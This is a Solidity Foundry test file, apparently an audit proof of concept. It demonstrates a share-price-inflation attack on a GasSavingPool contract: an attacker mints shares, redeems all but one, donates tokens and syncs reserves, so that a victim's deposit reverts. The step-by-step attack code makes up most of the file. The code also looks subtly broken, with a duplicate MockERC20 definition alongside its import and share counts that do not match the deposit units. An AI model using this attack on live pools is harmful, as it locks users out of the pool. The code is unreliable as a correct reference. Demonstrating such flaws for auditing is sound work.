pragma solidity 0.8.16;

import {Test, console} from "forge-std/Test.sol";
import {GSPFunding} from "../../contracts/GasSavingPool/impl/GSPFunding.sol";
import {GSPVault} from "../../contracts/GasSavingPool/impl/GSPVault.sol";
import {DecimalMath} from "../../contracts/lib/DecimalMath.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "../mocks/MockERC20.sol";

contract ExploitTest is Test {
    GSPFunding public gspFunding;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;
    
    address public attacker = address(0x1);
    address public victim = address(0x2);
    
    uint256 constant INITIAL_SUPPLY = 1001e18;
    uint256 constant DONATION_AMOUNT = 1000e18;
    uint256 constant I_VALUE = 1e18; // Assuming _I_ is 1e18 for simplicity
    
    event BuyShares(address to, uint256 increaseShares, uint256 totalShares);
    event SellShares(address payer, address to, uint256 decreaseShares, uint256 totalShares);

    function setUp() public {
        // Deploy mock tokens
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        
        // Deploy GSPFunding contract
        // Note: In a real scenario, this would be deployed through a factory
        // For testing, we'll deploy it directly with proper initialization
        gspFunding = new GSPFunding();
        
        // Initialize the pool (this would normally be done by a factory)
        vm.prank(address(this));
        gspFunding.init(address(baseToken), address(quoteToken), I_VALUE);
        
        // Give tokens to attacker and victim
        baseToken.mint(attacker, INITIAL_SUPPLY + DONATION_AMOUNT * 2);
        quoteToken.mint(attacker, INITIAL_SUPPLY + DONATION_AMOUNT * 2);
        baseToken.mint(victim, INITIAL_SUPPLY);
        quoteToken.mint(victim, INITIAL_SUPPLY);
        
        // Approve tokens to GSP contract
        vm.prank(attacker);
        baseToken.approve(address(gspFunding), type(uint256).max);
        vm.prank(attacker);
        quoteToken.approve(address(gspFunding), type(uint256).max);
        vm.prank(victim);
        baseToken.approve(address(gspFunding), type(uint256).max);
        vm.prank(victim);
        quoteToken.approve(address(gspFunding), type(uint256).max);
    }

    function testExploitSharePriceManipulation() public {
        console.log("=== Initial State ===");
        console.log("Attacker base balance:", baseToken.balanceOf(attacker));
        console.log("Attacker quote balance:", quoteToken.balanceOf(attacker));
        console.log("GSP total supply:", gspFunding.totalSupply());
        
        // Step 1: Attacker performs initial deposit to get shares
        console.log("\n=== Step 1: Attacker initial deposit ===");
        vm.prank(attacker);
        baseToken.transfer(address(gspFunding), INITIAL_SUPPLY);
        vm.prank(attacker);
        quoteToken.transfer(address(gspFunding), INITIAL_SUPPLY);
        
        vm.prank(attacker);
        (uint256 shares, uint256 baseInput, uint256 quoteInput) = gspFunding.buyShares(attacker);
        
        console.log("Shares minted:", shares);
        console.log("Base input:", baseInput);
        console.log("Quote input:", quoteInput);
        console.log("Attacker shares:", gspFunding.balanceOf(attacker));
        console.log("GSP total supply:", gspFunding.totalSupply());
        
        // Verify attacker got exactly 1001 shares (the minimum required for mint)
        require(shares == 1001, "Attacker should get 1001 shares");
        
        // Step 2: Attacker sells back most shares, keeping only 1 wei
        console.log("\n=== Step 2: Attacker sells back 1000 shares ===");
        uint256 sharesToSell = 1000;
        vm.prank(attacker);
        (uint256 baseAmount, uint256 quoteAmount) = gspFunding.sellShares(
            sharesToSell,
            attacker,
            0,
            0,
            "",
            block.timestamp + 3600
        );
        
        console.log("Base received:", baseAmount);
        console.log("Quote received:", quoteAmount);
        console.log("Attacker remaining shares:", gspFunding.balanceOf(attacker));
        console.log("GSP total supply:", gspFunding.totalSupply());
        
        // Verify attacker has only 1 share left
        require(gspFunding.balanceOf(attacker) == 1, "Attacker should have 1 share left");
        require(gspFunding.totalSupply() == 1, "Total supply should be 1");
        
        // Step 3: Attacker donates large amounts to inflate reserves
        console.log("\n=== Step 3: Attacker donates large amounts ===");
        vm.prank(attacker);
        baseToken.transfer(address(gspFunding), DONATION_AMOUNT);
        vm.prank(attacker);
        quoteToken.transfer(address(gspFunding), DONATION_AMOUNT);
        
        console.log("GSP base balance:", baseToken.balanceOf(address(gspFunding)));
        console.log("GSP quote balance:", quoteToken.balanceOf(address(gspFunding)));
        
        // Step 4: Attacker calls sync to update reserves
        console.log("\n=== Step 4: Attacker syncs reserves ===");
        vm.prank(attacker);
        gspFunding.sync();
        
        // Check the inflated reserves
        (uint256 baseReserve, uint256 quoteReserve) = gspFunding.getReserve();
        console.log("Base reserve:", baseReserve);
        console.log("Quote reserve:", quoteReserve);
        console.log("Total supply:", gspFunding.totalSupply());
        
        // Step 5: Victim tries to buy shares but fails due to high share price
        console.log("\n=== Step 5: Victim attempts to buy shares ===");
        uint256 victimDeposit = 100e18; // Much less than attacker's manipulation
        
        vm.prank(victim);
        baseToken.transfer(address(gspFunding), victimDeposit);
        vm.prank(victim);
        quoteToken.transfer(address(gspFunding), victimDeposit);
        
        // This should fail because the calculated shares will be less than 1001
        vm.prank(victim);
        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gspFunding.buyShares(victim);
        
        console.log("✓ Victim's buyShares reverted as expected");
        
        // Verify the DoS condition
        console.log("\n=== Verification ===");
        console.log("Victim base balance:", baseToken.balanceOf(victim));
        console.log("Victim quote balance:", quoteToken.balanceOf(victim));
        console.log("Victim shares:", gspFunding.balanceOf(victim));
        console.log("Pool is now in DoS state - normal users cannot buy shares!");
    }
    
    function testNormalOperationWithoutAttack() public {
        console.log("=== Testing normal operation ===");
        
        // Normal user deposits balanced amounts
        uint256 depositAmount = 1000e18;
        vm.prank(victim);
        baseToken.transfer(address(gspFunding), depositAmount);
        vm.prank(victim);
        quoteToken.transfer(address(gspFunding), depositAmount);
        
        // This should work normally
        vm.prank(victim);
        (uint256 shares, , ) = gspFunding.buyShares(victim);
        
        console.log("Shares received:", shares);
        require(shares > 1000, "Should receive more than 1000 shares in normal operation");
        console.log("✓ Normal operation works as expected");
    }
}

// Mock ERC20 token for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: transfer amount exceeds balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "ERC20: transfer amount exceeds balance");
        require(allowance[from][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }
}